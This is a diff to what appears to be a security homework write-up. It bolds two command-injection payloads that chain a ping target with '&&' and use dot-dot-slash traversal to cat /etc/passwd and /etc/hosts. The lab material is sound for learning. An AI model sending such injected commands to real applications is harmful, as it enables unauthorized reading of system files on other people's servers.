@@ -57,7 +57,7 @@ In this homework scenario, you will continue as an application security engineer
 
 * Using the dot-dot-slash method there are 5 sub-directories 
 
-* Using command: 8.8.8.8 && cat ../../../../../ETC/PASSWD
+* Using command: **8.8.8.8 && cat ../../../../../ETC/PASSWD**
 
 ### [etc/passwd](IMAGE/etcpass.md)
 
@@ -65,7 +65,7 @@ In this homework scenario, you will continue as an application security engineer
 
 * Using the dot-dot-slash method there are 5 sub-directories 
 
-* Using command: 8.8.8.8 && cat ../../../../../ETC/HOSTS
+* Using command: **8.8.8.8 && cat ../../../../../ETC/HOSTS**
 
 ### [etc/hosts](IMAGE/etchosts.md) 
 
